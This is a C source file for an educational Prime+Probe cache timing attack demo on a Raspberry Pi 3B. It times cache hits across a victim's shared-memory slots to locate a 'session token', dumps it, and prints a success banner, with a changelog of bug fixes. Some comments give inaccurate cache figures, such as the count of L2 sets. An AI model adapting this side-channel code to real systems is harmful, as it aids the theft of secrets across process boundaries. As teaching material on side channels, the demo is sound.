/*
 * attacker.c  –  Prime+Probe Demo  (Raspberry Pi 3B, ARMv8 / Cortex-A53)
 * VERSION 9 – all four bugs fixed.
 *
 * FIXES FROM V8
 * -------------
 *  BUG 1 FIXED – Eviction buffer was 1 MB (= 2 × L2), identical in size to
 *    the 1 MB spy buffer.  Walking 1 MB of a *different* virtual mapping
 *    does not guarantee that the 1 MB spy buffer is evicted from the
 *    physically-indexed L2.  Fix: raise EVICTION_BUF_SIZE to 4 × L2 = 2 MB
 *    so the eviction sweep is guaranteed to displace every cache set that
 *    the spy buffer occupies.
 *
 *  BUG 1b FIXED – prime() did only 2 passes.  The Cortex-A53 L2 is 8-way
 *    set-associative; a single sequential sweep can leave residual lines in
 *    ways that happened to be cold.  Fix: raise pass count to 4.
 *
 *  BUG 2 – Both processes were pinned to the same core in run_demo.sh.
 *    Fixed there (victim→core 0, attacker→core 1).  No code change here.
 *
 *  BUG 3 – Hit counting logic (ns < threshold → hit) is correct in
 *    principle.  It was masked by Bug 1: with a broken prime, every slot
 *    showed 0 hits.  Fixing Bug 1 restores the signal.  No logic change.
 *
 *  BUG 4 FIXED – find_best_and_second() always initialises *best = 0, so
 *    when all slots have 0 hits the stopping criterion 0 >= 3×0 fires
 *    immediately and declares slot 0 the winner.  Fix: require the winner
 *    to have at least MIN_HITS_TO_WIN hits before accepting the result.
 *
 *  CALIBRATION IMPROVED – calibrate() now measures latency on the actual
 *    shared-memory buffer (slot 0 of shm_base) rather than the private
 *    eviction buffer.  This gives a threshold tuned to the real spy-buffer
 *    access path, accounting for any NUMA / TLB effects on the shared
 *    mapping.
 *
 * TIMING NOTES (unchanged from v8)
 * ----------------------------------
 *  Each iteration probes 256 × 4 KB slots.
 *  Per-iteration cost ≈ 256 × ~2400 ns (DRAM miss) ≈ 614 µs probe time
 *  plus 90 ms wait = ~90.6 ms per iteration.
 *  With WINDOW_ITERS=10 each window takes ~0.9 s.
 *  The ratio criterion typically triggers after 3–6 windows (3–5 s).
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <time.h>
#include <signal.h>
#include <sched.h>
#include <ctype.h>

/* ── tunables (must match victim.c) ────────────────────────────────────── */
#define SHM_NAME            "/pp_demo_shm"
#define NUM_SLOTS           256
#define SLOT_SIZE           4096
#define TOTAL_SHM_SIZE      (NUM_SLOTS * SLOT_SIZE)     /* 1 MB */

/* ── cache / eviction ───────────────────────────────────────────────────── */
#define CACHE_LINE          64
#define L2_SIZE             (512 * 1024)

/*
 * FIX (Bug 1): was 2 × L2 = 1 MB.  The spy buffer (shm_base) is also 1 MB,
 * so a same-sized eviction sweep over a *different* virtual mapping cannot
 * reliably displace every spy-buffer line from the physically-indexed L2.
 * Using 4 × L2 = 2 MB guarantees full coverage of all 8192 L2 cache sets.
 */
#define EVICTION_BUF_SIZE   (4 * L2_SIZE)              /* 2 MB — Bug 1 fix */

/* ── timing ─────────────────────────────────────────────────────────────── */
#define TIMER_FREQ_FALLBACK 19200000ULL
#define HIT_THRESHOLD_NS    5000ULL
#define WAIT_US             90000                       /* 90 ms */

/* ── stopping criteria ───────────────────────────────────────────────────── */
#define RATIO_FACTOR        3
#define MIN_ITERS           100
#define WINDOW_ITERS        10
#define MAX_WINDOWS         80      /* ~72 s hard cap */

/*
 * FIX (Bug 4): require the winner to have accumulated at least this many
 * cache-hit observations before we trust the ratio criterion.  Without this
 * guard, 0 hits ≥ 3 × 0 hits fires immediately and slot 0 is always the
 * false winner when prime() is broken (or during early transient noise).
 */
#define MIN_HITS_TO_WIN     5

/* ── extraction ──────────────────────────────────────────────────────────── */
#define DUMP_BYTES          192

/* ── timer ───────────────────────────────────────────────────────────────── */
static inline uint64_t read_timer(void)
{
    uint64_t v;
    __asm__ volatile("isb\n\tmrs %0, cntvct_el0" : "=r"(v) :: "memory");
    return v;
}
static inline uint64_t read_timer_freq(void)
{
    uint64_t f;
    __asm__ volatile("mrs %0, cntfrq_el0" : "=r"(f));
    return f ? f : TIMER_FREQ_FALLBACK;
}
static inline uint64_t ticks_to_ns(uint64_t t, uint64_t hz)
{
    return (t * 1000000000ULL) / hz;
}

/* ── flush one slot from cache using dc civac ────────────────────────────── */
static void flush_slot(volatile uint8_t *base)
{
    for (size_t off = 0; off < SLOT_SIZE; off += CACHE_LINE)
        __asm__ volatile("dc civac, %0" :: "r"(base + off) : "memory");
    __asm__ volatile("dsb sy\nisb" ::: "memory");
}

/* ── calibration ─────────────────────────────────────────────────────────── */
/*
 * FIX (calibration improvement): measure on the actual spy buffer (shm_base
 * slot 0) rather than the private eviction buffer.  This captures the real
 * access-path latency for the shared mapping, including any TLB / page-table
 * differences vs. the anonymous eviction mapping.
 */
static uint64_t calibrate(volatile uint8_t *shm_base, uint64_t hz)
{
    const int N = 300;
    uint64_t hit_sum = 0, miss_sum = 0;
    volatile uint8_t *buf = shm_base;   /* use spy-buffer slot 0 */

    for (int i = 0; i < N; i++) {
        /* warm the slot into L2 */
        for (size_t o = 0; o < SLOT_SIZE; o += CACHE_LINE)
            { (void)buf[o]; __asm__ volatile("" ::: "memory"); }
        __asm__ volatile("dsb sy\nisb" ::: "memory");

        /* measure hit latency */
        __asm__ volatile("isb" ::: "memory");
        uint64_t t0 = read_timer();
        for (size_t o = 0; o < SLOT_SIZE; o += CACHE_LINE)
            { (void)buf[o]; __asm__ volatile("" ::: "memory"); }
        __asm__ volatile("dsb sy" ::: "memory");
        hit_sum += ticks_to_ns(read_timer() - t0, hz);

        /* flush the slot to DRAM */
        flush_slot(buf);

        /* measure miss latency */
        __asm__ volatile("isb" ::: "memory");
        uint64_t t2 = read_timer();
        for (size_t o = 0; o < SLOT_SIZE; o += CACHE_LINE)
            { (void)buf[o]; __asm__ volatile("" ::: "memory"); }
        __asm__ volatile("dsb sy" ::: "memory");
        miss_sum += ticks_to_ns(read_timer() - t2, hz);
    }

    uint64_t hit_ns  = hit_sum  / N;
    uint64_t miss_ns = miss_sum / N;
    printf("[attacker] Calibration  L2-hit = %lu ns   DRAM-miss = %lu ns\n",
           (unsigned long)hit_ns, (unsigned long)miss_ns);

    if (miss_ns <= hit_ns + 200) {
        printf("[attacker] WARNING: hit/miss gap too small — using fallback %llu ns\n",
               (unsigned long long)HIT_THRESHOLD_NS);
        return HIT_THRESHOLD_NS;
    }
    uint64_t thr = (hit_ns + miss_ns) / 2;
    printf("[attacker] Hit/miss threshold = %lu ns  (midpoint)\n\n",
           (unsigned long)thr);
    return thr;
}

/* ── prime ───────────────────────────────────────────────────────────────── */
/*
 * FIX (Bug 1b): was 2 passes.  The Cortex-A53 L2 is 8-way set-associative;
 * a 2-pass sequential sweep over 2 MB still has a small chance of leaving
 * residual lines in a cold way.  4 passes over 2 MB gives solid eviction.
 */
static void prime(volatile uint8_t *evict_buf)
{
    for (int pass = 0; pass < 4; pass++)            /* was 2 — Bug 1b fix */
        for (size_t off = 0; off < EVICTION_BUF_SIZE; off += CACHE_LINE)
            { (void)evict_buf[off]; __asm__ volatile("" ::: "memory"); }
    __asm__ volatile("dsb sy\nisb" ::: "memory");
}

/* ── probe ───────────────────────────────────────────────────────────────── */
static uint64_t probe_slot(volatile uint8_t *shm_base, int s, uint64_t hz)
{
    volatile uint8_t *slot = shm_base + (size_t)s * SLOT_SIZE;
    __asm__ volatile("isb" ::: "memory");
    uint64_t t0 = read_timer();
    for (size_t off = 0; off < SLOT_SIZE; off += CACHE_LINE)
        { (void)slot[off]; __asm__ volatile("" ::: "memory"); }
    __asm__ volatile("dsb sy" ::: "memory");
    return ticks_to_ns(read_timer() - t0, hz);
}

/* ── stats ───────────────────────────────────────────────────────────────── */
typedef struct {
    uint64_t ns_sum;
    uint64_t hits;
} SlotStats;

static void find_best_and_second(SlotStats stats[], int n,
                                  int *best, int *runner_up)
{
    *best = 0; *runner_up = -1;
    for (int s = 1; s < n; s++) {
        if (stats[s].hits > stats[*best].hits) {
            *runner_up = *best;
            *best = s;
        } else if (*runner_up < 0 ||
                   stats[s].hits > stats[*runner_up].hits) {
            *runner_up = s;
        }
    }
    if (*runner_up < 0) *runner_up = (*best == 0) ? 1 : 0;
}

/* ── bar chart ───────────────────────────────────────────────────────────── */
static void print_bar_chart(SlotStats stats[], int n, int discovered,
                             uint64_t thr, int iters)
{
    /* rank top 20 slots by hit count */
    int order[256];
    for (int i = 0; i < n; i++) order[i] = i;
    for (int i = 1; i < n; i++) {
        int key = order[i], j = i - 1;
        while (j >= 0 && stats[order[j]].hits < stats[key].hits)
            { order[j+1] = order[j]; j--; }
        order[j+1] = key;
    }

    int print_count = 20;
    int disc_in_top = 0;
    for (int i = 0; i < print_count; i++)
        if (order[i] == discovered) { disc_in_top = 1; break; }
    if (!disc_in_top) order[print_count - 1] = discovered;

    /* scale bars by avg latency (shorter = hotter = more hits = interesting) */
    uint64_t lo = UINT64_MAX, hi = 0;
    for (int i = 0; i < print_count; i++) {
        uint64_t a = stats[order[i]].ns_sum / (uint64_t)iters;
        if (a < lo) lo = a;
        if (a > hi) hi = a;
    }
    uint64_t range = (hi > lo) ? hi - lo : 1;

    printf("\n");
    printf("  Threshold: %lu ns  |  SHORT = FAST = L2 hit = session token slot\n",
           (unsigned long)thr);
    printf("  (Showing top 20 slots by hit count out of %d total)\n\n", n);
    printf("  ┌──────┬──────────┬───────────┬────────────────────────────────────────┐\n");
    printf("  │ Slot │  Avg ns  │  Hit rate │ Latency bar                            │\n");
    printf("  ├──────┼──────────┼───────────┼────────────────────────────────────────┤\n");
    for (int i = 0; i < print_count; i++) {
        int s = order[i];
        uint64_t avg = stats[s].ns_sum / (uint64_t)iters;
        uint64_t pct = stats[s].hits * 100 / (uint64_t)iters;
        int bar = (int)(((avg - lo) * 40) / range);
        char b[44]; memset(b, '#', bar); b[bar] = '\0';
        printf("  │ %3d  │ %8lu │      %3llu%% │ %-40s │%s\n",
               s, (unsigned long)avg, (unsigned long long)pct, b,
               (s == discovered) ? " ◄ SESSION TOKEN" : "");
    }
    printf("  └──────┴──────────┴───────────┴────────────────────────────────────────┘\n");
    printf("  (Remaining %d slots all had 0–1 hits)\n", n - print_count);
}

/* ── hex dump ────────────────────────────────────────────────────────────── */
static void hexdump(const uint8_t *slot, size_t bytes)
{
    printf("  ╔══════════════════════════════════════════════════════════════════╗\n");
    printf("  ║  Offset   Hex dump (16 bytes/row)              ASCII            ║\n");
    printf("  ╠══════════════════════════════════════════════════════════════════╣\n");
    for (size_t i = 0; i < bytes; i += 16) {
        printf("  ║  %04zx   ", i);
        for (size_t j = 0; j < 16; j++) {
            if (i+j < bytes) printf("%02x ", slot[i+j]); else printf("   ");
            if (j == 7) printf(" ");
        }
        printf(" │ ");
        for (size_t j = 0; j < 16 && i+j < bytes; j++) {
            uint8_t c = slot[i+j];
            printf("%c", (isprint(c) && c < 0x7f) ? c : '.');
        }
        size_t rem = bytes - i;
        if (rem < 16) for (size_t p = rem; p < 16; p++) printf(" ");
        printf(" ║\n");
    }
    printf("  ╚══════════════════════════════════════════════════════════════════╝\n");
}

/* ── proof banner ────────────────────────────────────────────────────────── */
static void print_proof_banner(int discovered,
                                uint64_t best_hits, uint64_t runner_hits,
                                int iters, const uint8_t *shm_base)
{
    const uint8_t *slot = shm_base + (size_t)discovered * SLOT_SIZE;
    char token[DUMP_BYTES + 1];
    memset(token, 0, sizeof(token));
    size_t slen = strnlen((const char *)slot, DUMP_BYTES);
    if (slen > 0 && slen < DUMP_BYTES)
        memcpy(token, slot, slen);
    else
        snprintf(token, sizeof(token), "(binary — see hex dump above)");

    uint64_t win_pct    = best_hits   * 100 / (uint64_t)iters;
    uint64_t runner_pct = runner_hits * 100 / (uint64_t)iters;
    double   ratio      = runner_hits > 0
                          ? (double)best_hits / (double)runner_hits : 99.0;

    printf("\n");
    printf("  ╔══════════════════════════════════════════════════════════════════╗\n");
    printf("  ║        *** PRIME+PROBE ATTACK SUCCESSFUL ***                    ║\n");
    printf("  ╠══════════════════════════════════════════════════════════════════╣\n");
    printf("  ║  Total slots searched    : %-38d ║\n", NUM_SLOTS);
    printf("  ║  Total iterations        : %-38d ║\n", iters);
    printf("  ║  Discovered slot         : %-38d ║\n", discovered);
    printf("  ║  Winner  hit-rate        : %llu%% (slot %d)%-28s║\n",
           (unsigned long long)win_pct, discovered, "");
    printf("  ║  Runner-up hit-rate      : %llu%% (next best)%-25s║\n",
           (unsigned long long)runner_pct, "");
    printf("  ║  Signal/noise ratio      : %.1fx%-38s║\n", ratio, "");
    printf("  ╠══════════════════════════════════════════════════════════════════╣\n");
    printf("  ║  EXTRACTED SESSION TOKEN:                                       ║\n");
    size_t tlen = strlen(token);
    for (size_t off = 0; off < tlen; off += 66)
        printf("  ║    %-66.66s║\n", token + off);
    printf("  ╠══════════════════════════════════════════════════════════════════╣\n");
    printf("  ║  Attacker searched %3d slots with NO prior slot knowledge.     ║\n",
           NUM_SLOTS);
    printf("  ║  Slot was discovered purely from cache timing.                  ║\n");
    printf("  ║  Attacker now exiting — victim is still running.                ║\n");
    printf("  ╚══════════════════════════════════════════════════════════════════╝\n");
}

/* ── signal ──────────────────────────────────────────────────────────────── */
static volatile int interrupted = 0;
static void handle_sigint(int s) { (void)s; interrupted = 1; }

/* ── main ────────────────────────────────────────────────────────────────── */
int main(void)
{
    printf("╔══════════════════════════════════════════════════════════════╗\n");
    printf("║  Prime+Probe Demo v9 — ATTACKER  (ARMv8 / Cortex-A53)      ║\n");
    printf("║  Searching %d slots blindly for the session token.         ║\n",
           NUM_SLOTS);
    printf("║  No prior knowledge of which slot holds the token.          ║\n");
    printf("╚══════════════════════════════════════════════════════════════╝\n\n");

    /* 1. Timer */
    uint64_t freq_hz = read_timer_freq();
    printf("[attacker] Timer %llu Hz  (%.1f ns/tick)\n\n",
           (unsigned long long)freq_hz, 1e9 / (double)freq_hz);

    /*
     * 2. Eviction buffer — 2 MB private, pre-faulted.
     *    FIX (Bug 1): was 1 MB.  Must be 4 × L2 = 2 MB to guarantee full
     *    eviction of the 1 MB spy buffer from the 512 KB L2.
     */
    volatile uint8_t *evict_buf = mmap(NULL, EVICTION_BUF_SIZE,
                                       PROT_READ | PROT_WRITE,
                                       MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (evict_buf == MAP_FAILED) { perror("mmap evict"); return 1; }
    memset((void *)evict_buf, 0xCC, EVICTION_BUF_SIZE);
    printf("[attacker] Eviction buffer %d KB ready  (4 × L2, Bug-1 fix)\n\n",
           (int)(EVICTION_BUF_SIZE / 1024));

    /* 3. Open shared memory (read-only) */
    printf("[attacker] Waiting for victim shared memory …\n");
    int shm_fd = -1;
    for (int a = 0; a < 100 && shm_fd < 0; a++) {
        shm_fd = shm_open(SHM_NAME, O_RDONLY, 0);
        if (shm_fd < 0) { printf("."); fflush(stdout); usleep(100000); }
    }
    if (shm_fd < 0) { fprintf(stderr, "\n[attacker] shm not found.\n"); return 1; }
    printf("\n[attacker] Shared memory opened read-only (fd=%d)\n", shm_fd);

    volatile uint8_t *shm_base = mmap(NULL, TOTAL_SHM_SIZE,
                                      PROT_READ, MAP_SHARED, shm_fd, 0);
    if (shm_base == MAP_FAILED) { perror("mmap shm"); return 1; }
    printf("[attacker] Spy buffer mapped at %p  (%d KB, %d slots)\n\n",
           (void *)shm_base,
           (int)(TOTAL_SHM_SIZE / 1024),
           NUM_SLOTS);

    /*
     * 4. Calibrate — now on shm_base slot 0 (the real spy-buffer path).
     *    FIX (calibration): was calibrating on evict_buf, which is an
     *    anonymous mapping and has different TLB/physical characteristics
     *    from the shared memory mapping.
     */
    printf("[attacker] Calibrating hit/miss threshold on spy buffer …\n");
    uint64_t threshold_ns = calibrate(shm_base, freq_hz);

    /* 5. Discovery loop */
    SlotStats *stats = calloc(NUM_SLOTS, sizeof(SlotStats));
    if (!stats) { perror("calloc"); return 1; }
    signal(SIGINT, handle_sigint);

    int total_iters = 0;
    int discovered  = -1;

    printf("[attacker] Starting blind discovery across %d slots.\n", NUM_SLOTS);
    printf("[attacker] Stopping: winner ≥ %dx runner-up  AND  iters ≥ %d"
           "  AND  hits ≥ %d\n\n",
           RATIO_FACTOR, MIN_ITERS, MIN_HITS_TO_WIN);

    for (int w = 0; w < MAX_WINDOWS && !interrupted; w++) {

        /* one window */
        for (int i = 0; i < WINDOW_ITERS && !interrupted; i++) {
            prime(evict_buf);
            sched_yield();
            usleep(WAIT_US);

            for (int s = 0; s < NUM_SLOTS; s++) {
                uint64_t ns = probe_slot(shm_base, s, freq_hz);
                stats[s].ns_sum += ns;
                if (ns < threshold_ns) stats[s].hits++;
            }
            total_iters++;
        }

        /* evaluate */
        int best, runner_up;
        find_best_and_second(stats, NUM_SLOTS, &best, &runner_up);
        uint64_t best_hits   = stats[best].hits;
        uint64_t runner_hits = stats[runner_up].hits;
        double   ratio       = (runner_hits > 0)
                               ? (double)best_hits / (double)runner_hits
                               : 99.0;

        printf("[attacker] window %2d/%d | iters=%-4d | "
               "best=slot %-3d (%llu hits) | "
               "2nd=slot %-3d (%llu hits) | "
               "ratio=%.1fx\n",
               w + 1, MAX_WINDOWS, total_iters,
               best,      (unsigned long long)best_hits,
               runner_up, (unsigned long long)runner_hits,
               ratio);
        fflush(stdout);

        /*
         * FIX (Bug 4): added best_hits >= MIN_HITS_TO_WIN guard.
         * Previously 0 >= 3×0 was true and fired a false win on the very
         * first evaluation when prime() was broken.
         */
        if (total_iters >= MIN_ITERS &&
            best_hits   >= MIN_HITS_TO_WIN &&
            (int64_t)best_hits >= (int64_t)(RATIO_FACTOR * runner_hits)) {
            discovered = best;
            printf("\n[attacker] Stopping criterion met  "
                   "(ratio %.1fx ≥ %dx, iters %d ≥ %d, hits %llu ≥ %d)\n",
                   ratio, RATIO_FACTOR, total_iters, MIN_ITERS,
                   (unsigned long long)best_hits, MIN_HITS_TO_WIN);
            break;
        }
    }

    if (discovered < 0) {
        int best, runner_up;
        find_best_and_second(stats, NUM_SLOTS, &best, &runner_up);
        discovered = best;
        printf("[attacker] Max windows reached — best candidate: slot %d\n",
               discovered);
    }

    /* 6. Timing bar chart */
    printf("\n══════════════════════════════════════════════════════════════\n");
    printf("  DISCOVERY RESULTS  (%d iterations, %d slots searched)\n",
           total_iters, NUM_SLOTS);
    printf("══════════════════════════════════════════════════════════════\n");
    print_bar_chart(stats, NUM_SLOTS, discovered, threshold_ns, total_iters);

    /* 7. Data extraction */
    printf("\n══════════════════════════════════════════════════════════════\n");
    printf("  EXTRACTING SESSION TOKEN FROM SLOT %d\n", discovered);
    printf("══════════════════════════════════════════════════════════════\n\n");
    hexdump((const uint8_t *)shm_base + (size_t)discovered * SLOT_SIZE,
            DUMP_BYTES);

    /* 8. Proof banner */
    int best_idx, runner_idx;
    find_best_and_second(stats, NUM_SLOTS, &best_idx, &runner_idx);
    print_proof_banner(discovered,
                       stats[best_idx].hits,
                       stats[runner_idx].hits,
                       total_iters,
                       (const uint8_t *)shm_base);

    /* 9. Cleanup */
    free(stats);
    munmap((void *)evict_buf, EVICTION_BUF_SIZE);
    munmap((void *)shm_base,  TOTAL_SHM_SIZE);
    close(shm_fd);
    printf("\n[attacker] Exiting — victim process is still running.\n");
    return 0;
}
